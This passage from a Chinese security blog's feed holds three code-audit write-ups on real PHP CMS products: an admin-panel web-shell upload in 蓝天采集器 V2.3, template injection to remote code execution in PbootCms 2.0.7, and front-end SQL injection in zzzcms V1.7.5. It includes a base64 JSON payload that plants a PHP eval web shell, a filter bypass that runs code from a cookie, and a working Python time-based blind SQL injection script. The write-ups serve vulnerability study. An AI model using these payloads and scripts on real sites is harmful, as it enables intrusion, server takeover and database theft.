class="line"><span class="keyword">if</span>($plugin[<span class="string">'type'</span>]==<span class="string">'release'</span>)&#123;</span><br><span class="line"></span><br><span class="line">model(<span class="string">'ReleaseApp'</span>)-&gt;addCms($newData,$plugin[<span class="string">'code'</span>],$plugin[<span class="string">'tpl'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;dispatchJump(<span class="keyword">true</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>($plugin[<span class="string">'type'</span>]==<span class="string">'func'</span>)&#123;</span><br><span class="line"></span><br><span class="line">$newData[<span class="string">'module'</span>]=$plugin[<span class="string">'module'</span>];</span><br><span class="line">model(<span class="string">'FuncApp'</span>)-&gt;addFunc($newData,$plugin[<span class="string">'code'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;dispatchJump(<span class="keyword">true</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;dispatchJump(<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数直接接收<code>post</code>参数然后进行<code>base64</code>和<code>json</code>解码，接着进行了判空操作，接着如果满足<code>$plugin[&#39;type&#39;]==&#39;release&#39;</code>就会调用<code>addCms</code>函数，跟进该函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addCms</span><span class="params">($cms,$code=<span class="string">''</span>,$tpl=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($cms[<span class="string">'app'</span>]))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cms[<span class="string">'module'</span>]=<span class="string">'cms'</span>;</span><br><span class="line">$cms[<span class="string">'uptime'</span>]=$cms[<span class="string">'uptime'</span>]&gt;<span class="number">0</span>?$cms[<span class="string">'uptime'</span>]:NOW_TIME;</span><br><span class="line">$cmsData=<span class="keyword">$this</span>-&gt;where(<span class="string">'app'</span>,$cms[<span class="string">'app'</span>])-&gt;find();</span><br><span class="line">$success=<span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($cmsData))&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;strict(<span class="keyword">false</span>)-&gt;where(<span class="string">'app'</span>,$cms[<span class="string">'app'</span>])-&gt;update($cms);</span><br><span class="line">$success=<span class="keyword">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$cms[<span class="string">'addtime'</span>]=NOW_TIME;</span><br><span class="line"><span class="keyword">$this</span>-&gt;isUpdate(<span class="keyword">false</span>)-&gt;allowField(<span class="keyword">true</span>)-&gt;save($cms);</span><br><span class="line">$cms[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">$success=$cms[<span class="string">'id'</span>]&gt;<span class="number">0</span>?<span class="keyword">true</span>:<span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($success)&#123;</span><br><span class="line">$cmsAppPath=config(<span class="string">'plugin_path'</span>).<span class="string">'/release'</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($code))&#123;</span><br><span class="line"></span><br><span class="line">write_dir_file($cmsAppPath.<span class="string">'/cms/'</span>.ucfirst($cms[<span class="string">'app'</span>]).<span class="string">'.php'</span>, $code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($tpl))&#123;</span><br><span class="line"></span><br><span class="line">write_dir_file($cmsAppPath.<span class="string">'/view/cms/'</span>.ucfirst($cms[<span class="string">'app'</span>]).<span class="string">'.html'</span>, $tpl);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数中后面如果满足<code>$success</code>为<code>true</code>则会调用<code>write_dir_file</code>函数，跟进该函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_dir_file</span><span class="params">($filename,$data,$flags=null,$content=null)</span></span>&#123;</span><br><span class="line">$dir = dirname($filename);</span><br><span class="line"><span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">mkdir($dir,<span class="number">0777</span>,<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> file_put_contents($filename,$data,$flags,$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数的功能是去执行写文件操作，在整个流程下来后我们会发现，该流程并没有对写入的<code>code</code>进行一些过滤和检查，，那么如果我们可以满足代码流程中的一些条件，就可以实现写入<code>shell</code></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根据代码流程写出对应的<code>json</code>格式<code>payload</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"app"</span>:<span class="string">"shell"</span>,<span class="attr">"name"</span>:<span class="string">"shell"</span>,<span class="attr">"type"</span>:<span class="string">"release"</span>,<span class="attr">"module"</span>:<span class="string">"ok"</span>,<span class="attr">"code"</span>:<span class="string">"PD9waHAgZXZhbCgkX1BPU1RbYV0pOyA/Pg=="</span>&#125;</span><br></pre></td></tr></table></figure><p>其中<code>code</code>在传入后进行了<code>base64</code>解码，在这里要对应的加密</p><p>接着将整段<code>payload</code>以<code>base64</code>形式加密，最后以<code>post</code>形式传入进去，如图</p><p><img src="/2020/05/09/蓝天采集器V2-3后台getshell/1.png" alt="1"></p><p>接着去<code>\plugin\release\cms</code>文件夹下可以看到我们写入的<code>shell</code></p><p><img src="/2020/05/09/蓝天采集器V2-3后台getshell/2.png" alt="2"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;蓝天采集器是一款免费的数据采集发布爬虫软件，采用php+mysql开发，可部署在云服务器，几乎能采集所有类型的网页，无缝对接各类CMS建站程
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PbootCms-2.0.7模板注入到RCE</title>
    <link href="https://yml-sec.top/2020/05/07/PbootCms-2-0-7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%88%B0RCE/"/>
    <id>https://yml-sec.top/2020/05/07/PbootCms-2-0-7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%88%B0RCE/</id>
    <published>2020-05-07T12:41:10.000Z</published>
    <updated>2020-05-09T04:32:43.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在<code>90</code>论坛上看到一篇关于该<code>CMS</code>的贴子，文章中分析的是两处注入，以前没有分析过该<code>CMS</code>，决定对着补丁看一下近期的版本来分析下</p><blockquote><p>环境：</p><p>Windows 10</p><p>php5.5.9</p><p>Apache</p></blockquote><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>在<code>GitHub</code>上看到该<code>cms</code>近期版本更新很频繁</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/3.png" alt="3"></p><p>本文先对<code>2.0.7</code>版本分析下，首先与<code>2.0.8</code>版本来对比下</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/4.png" alt="4"></p><p>该处增加了一些敏感函数的过滤和正则上的改动，这说明在<code>2.0.7</code>版本中该段代码存在着安全问题，我们来看一下该段代码所在的函数做起着什么作用</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/5.png" alt="5"></p><p>在源码中找到了该函数的注释，该函数是用来解析模板中的<code>IF</code>标签</p><p>继续阅读我们可以看到，在进行了过滤之后，如果没有发现危险的项目，会将if中的代码带入到<code>eval</code>中执行，如图</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/6.png" alt="6"></p><p>那么可以联想到，如果可以在页面中插入<code>if</code>标签并且绕过该处的安全验证，就可以执行任意<code>php</code>代码，下面来寻找一下是否存在插入<code>if</code>标签的地方，寻找之前我们先看一下该<code>CMS</code>的标签语法</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/7.png" alt="7"></p><p><code>{pboot:if(TRUE)}test{/pboot:if}</code></p><p>在后台尝试在站点信息编辑页面插入</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/8.png" alt="8"></p><p>进入首页看一下</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/9.png" alt="9"></p><p>可以看到这里是成功解析了的，那么下面我们需要来思考如何绕过前面的安全过滤</p><p>我们来看第一个判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((function_exists($value) || preg_match(<span class="string">'/^eval$/i'</span>, $value)) &amp;&amp; ! in_array($value, $white_fun)) &#123;</span><br><span class="line">  $danger = <span class="keyword">true</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该处的意思是如果<code>if</code>中存在着一个函数并且该函数不在白名单中将会被认定为危险，看一下白名单中的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$white_fun = <span class="keyword">array</span>(<span class="string">'date'</span>,<span class="string">'in_array'</span>,<span class="string">'explode'</span>,<span class="string">'implode'</span>);</span><br></pre></td></tr></table></figure><p>显然没有可以利用的函数，我们需要一些可以进行输出或者执行代码的函数来进行下一步的验证，在该处我们如果想越过验证可以参考一下<code>KCon 2019</code>中<code>P</code>神的一个议题</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/10.png" alt="10"></p><p>简单的来说就是可以在函数名和括号之间插入一些控制字符，这样函数仍然会正常执行，但是在本例中<code>function_exists</code>将会失效，我们可以插入下面的代码来尝试下</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/11.png" alt="11"></p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/12.png" alt="12"></p><p>可以看到是成功执行的，下面来看一下第二个过滤点的<code>if</code>判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)/i'</span>, $matches[<span class="number">1</span>][$i]))</span><br></pre></td></tr></table></figure><p>这里虽然过滤了很多函数，但是我们还有assert可用，首先想到的直接是下面的写法</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/13.png" alt="13"></p><p>但是经过测试，存在<code>$</code>符号的时候模板不会解析，该处我并没有深究为什么出现这个情况，而是想到了<code>codebreaking</code>中无参数<code>RCE</code>来解决这个问题，这样就可以不传入其他一些字符，只使用函数来利用了</p><p>这里可以使用<code>getallheaders</code>来获取<code>head</code>头</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/14.png" alt="14"></p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/15.png" alt=""></p><p>这里可以利用<code>cookie</code>，使用<code>current</code>方法，并且将<code>print_r</code>改成<code>assert</code></p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/16.png" alt="16"></p><p>将代码写在<code>cookie</code>中执行</p><p><img src="/2020/05/07/PbootCms-2-0-7模板注入到RCE/17.png" alt="17"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在&lt;code&gt;90&lt;/code&gt;论坛上看到一篇关于该&lt;code&gt;CMS&lt;/code&gt;的贴子，文章中分析的是两处注入，以前没有分析过该&lt;cod
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>zzzcmsV1.7.5前台sql注入</title>
    <link href="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://yml-sec.top/2020/05/06/zzzcmsV1-7-5%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/</id>
    <published>2020-05-06T11:42:22.000Z</published>
    <updated>2020-05-06T12:37:39.490Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>查看cnvd时发现了该cms一个较新的漏洞，决定分析一下</p><p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/1.png" alt="1"></p><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>漏洞的触发点在<code>plugins/sms/sms_list.php</code>，该处文件可以直接在前台访问，看一下关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'../../inc/zzz_admin.php'</span>;</span><br><span class="line">$act=getform(<span class="string">"act"</span>,<span class="string">"get"</span>);</span><br><span class="line">$id=getform(<span class="string">"id"</span>,<span class="string">"post"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($act) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'del'</span>:</span><br><span class="line">db_delete(<span class="string">'sms'</span>,<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'delall'</span>:</span><br><span class="line">db_delete(<span class="string">'sms'</span>,<span class="keyword">array</span>(<span class="string">'smsonoff'</span>=&gt;<span class="number">0</span>));</span><br><span class="line">phpgo (<span class="string">'sms_list.php'</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>该处的<code>$id</code>与<code>$act</code>对输入均没有进行过滤的操作，跟进下方的<code>db_delete</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_delete</span><span class="params">( $table, $where, $d = NULL )</span> </span>&#123;</span><br><span class="line">$db = $_SERVER[ <span class="string">'db'</span> ];</span><br><span class="line">$d = $d ? $d : $db;</span><br><span class="line"><span class="keyword">if</span> ( !$d ) <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line"><span class="keyword">if</span> ( ifnum( $where ) ) &#123;</span><br><span class="line">$where = table_id( $table ) . <span class="string">'='</span> . $where;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( is_array( $where ) ) &#123;</span><br><span class="line">$arrkey = array_keys( $where );</span><br><span class="line"><span class="keyword">if</span> ( $arrkey[ <span class="number">0</span> ] === <span class="number">0</span> ) &#123;</span><br><span class="line">$where = <span class="keyword">array</span>( table_id( $table ) =&gt; $where );</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( $where == <span class="string">'recy'</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( $table == <span class="string">'content'</span> )$where = <span class="keyword">array</span>( <span class="string">'c_onoff'</span> =&gt; <span class="number">2</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$whereadd = db_cond_to_sqladd( $where );</span><br><span class="line"><span class="comment">//var_dump("DELETE FROM [dbpre]$table $whereadd");</span></span><br><span class="line"><span class="keyword">return</span> db_exec( <span class="string">"DELETE FROM [dbpre]$table $whereadd"</span>, $d );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>db_cond_to_sqladd</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_cond_to_sqladd</span><span class="params">( $where )</span> </span>&#123;</span><br><span class="line">$s = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ( DB_TYPE == <span class="string">'access'</span> )$where = toutf( $where );</span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">empty</span>( $where ) ) &#123;</span><br><span class="line">$s = <span class="string">' WHERE '</span>;</span><br><span class="line"><span class="keyword">if</span> ( is_array( $where ) ) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ( $where <span class="keyword">as</span> $k =&gt; $v ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( !is_array( $v ) ) &#123;</span><br><span class="line">                    $op = substr( $k, <span class="number">-1</span> );</span><br><span class="line">                    <span class="keyword">if</span> ( $op == <span class="string">'&gt;'</span> || $op == <span class="string">'&lt;'</span>  || $op == <span class="string">'='</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span>(substr( $k, <span class="number">-2</span> )== <span class="string">'&gt;='</span> || substr( $k, <span class="number">-2</span> )== <span class="string">'&lt;='</span> || substr( $k, <span class="number">-2</span> )== <span class="string">'&lt;&gt;'</span>) &#123;</span><br><span class="line">$op=substr( $k, <span class="number">-2</span> );</span><br><span class="line">$k = substr( $k, <span class="number">0</span>, <span class="number">-2</span> );</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$k = substr( $k, <span class="number">0</span>, <span class="number">-1</span> );</span><br><span class="line">&#125;</span><br><span class="line">$s .= <span class="string">"`$k`$op$v AND"</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $v = ( ifnum( $v ) ) ? $v : <span class="string">"'"</span> . ( $v ) . <span class="string">"'"</span>;</span><br><span class="line">                        $s .= <span class="string">"`$k`=$v AND "</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( <span class="keyword">isset</span>( $v[ <span class="number">0</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// OR 效率比 IN 高</span></span><br><span class="line">$s .= <span class="string">'('</span>;</span><br><span class="line"><span class="comment">//$v = array_reverse($v);</span></span><br><span class="line"><span class="keyword">foreach</span> ( $v <span class="keyword">as</span> $v1 ) &#123;</span><br><span class="line">$v1 = ( ifnum( $v1 ) ) ? $v1 : <span class="string">"'"</span> . ( $v1 ) . <span class="string">"'"</span>;</span><br><span class="line">$s .= <span class="string">"`$k`=$v1 OR "</span>;</span><br><span class="line">&#125;</span><br><span class="line">$s = substr( $s, <span class="number">0</span>, <span class="number">-4</span> );</span><br><span class="line">$s .= <span class="string">') AND '</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$ids = implode(',', $v);</span></span><br><span class="line"><span class="comment">$s .= "$k IN ($ids) AND ";</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">foreach</span> ( $v <span class="keyword">as</span> $k1 =&gt; $v1 ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( $k1 == <span class="string">'LIKE'</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span>(ifstrin($k,<span class="string">','</span>))&#123;</span><br><span class="line"><span class="keyword">foreach</span> (splits($k) <span class="keyword">as</span> $v2)&#123;</span><br><span class="line">$ss .= <span class="string">"`$v2` LIKE '%"</span>.$v1.<span class="string">"%' or"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ss=rtrim($ss,<span class="string">'or'</span>);</span><br><span class="line">$s .= <span class="string">"($ss) AND"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$s .= <span class="string">"`$k` LIKE '%"</span>.$v1.<span class="string">"%' AND"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>( $k1 == <span class="string">'FIND'</span>)&#123;</span><br><span class="line">$s .= <span class="string">"(FIND_IN_SET($v1,`$k`) or $k='') AND"</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span> <span class="keyword">if</span>( $k1 == <span class="string">'!FIND'</span>)&#123;</span><br><span class="line">$s .= <span class="string">"!FIND_IN_SET($v1,`$k`) AND"</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($k1 == <span class="string">'BETWEEN'</span>)&#123;               </span><br><span class="line">                            $s .= <span class="string">"`$k` BETWEEN $v1 AND"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(is_int( $v1 ) || is_float( $v1 ) || $k1==<span class="string">'='</span>)&#123;</span><br><span class="line">$s .= <span class="string">"`$k`$k1  $v1  AND "</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$s .= <span class="string">"`$k`$k1 '"</span> . ( $v1 ) . <span class="string">"' AND "</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$s = substr( $s, <span class="number">0</span>, <span class="number">-4</span> );</span><br><span class="line">            <span class="comment">//var_dump($s);</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$s .= $where;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里我们需要进行一些构造，使得代码运行到如下分支</p><p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/2.png" alt=""></p><p>注意到该处语句没有任何的过滤，直接拼接返回给了<code>db_delete</code>函数</p><p>在<code>db_delete</code>函数中紧接着运行了<code>sql</code>语句</p><p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/3.png" alt="3"></p><p>跟进<code>db_exec</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_exec</span><span class="params">( $sql, $d = NULL ,$log=true)</span> </span>&#123;</span><br><span class="line">$db = $_SERVER[ <span class="string">'db'</span> ];</span><br><span class="line">$d = $d ? $d : $db;</span><br><span class="line"><span class="keyword">if</span> ( !$d ) <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">$sql = str_replace( <span class="string">'[dbpre]'</span>, DB_PRE, $sql );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    var_dump($sql);</span><br><span class="line">$n = $d-&gt;exec( $sql );</span><br><span class="line">db_errno_errstr( $n, $d,$sql);</span><br><span class="line">str_log( $sql.<span class="string">"\t"</span> , <span class="string">'log'</span> );</span><br><span class="line"><span class="keyword">return</span> $n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里函数将参数进行替换后直接将语句带入了数据库执行，在这里我们就存在着机会将语句进行合理的拼接进行SQL注入</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先尝试报错注入，输出一下<code>sql</code>语句</p><p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/4.png" alt=""></p><p>但是程序并没有抛出错误代出数据，可能是 程序对异常抛出做了屏蔽处理，接着试一下时间盲注</p><p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/5.png" alt="5"></p><p>程序确实因为<code>sleep</code>函数的作用出现了响应延迟，这也意味着可以使用时间盲注进行利用，这里写了个利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://localhost/zzzcms/plugins/sms/sms_list.php?act=del'</span></span><br><span class="line">sql_dict=<span class="string">'1234567890-_`~qwertyuiopasdfghjklzxcvbnm,.&lt;&gt;&#123;&#125;[]@!#$%^&amp;*()'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    print(<span class="string">'============================='</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> sql_dict:</span><br><span class="line">        payload = &#123;<span class="string">'id[=if((ascii(substr((select database()),&#123;&#125;,1))="&#123;&#125;"),sleep(5),1)#]'</span>.format(i,ord(j)):<span class="string">'aaaa'</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            html = s.post(url,data=payload,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + j</span><br><span class="line">            print(result)</span><br><span class="line">            s.get(url)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/6.png" alt="6"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" 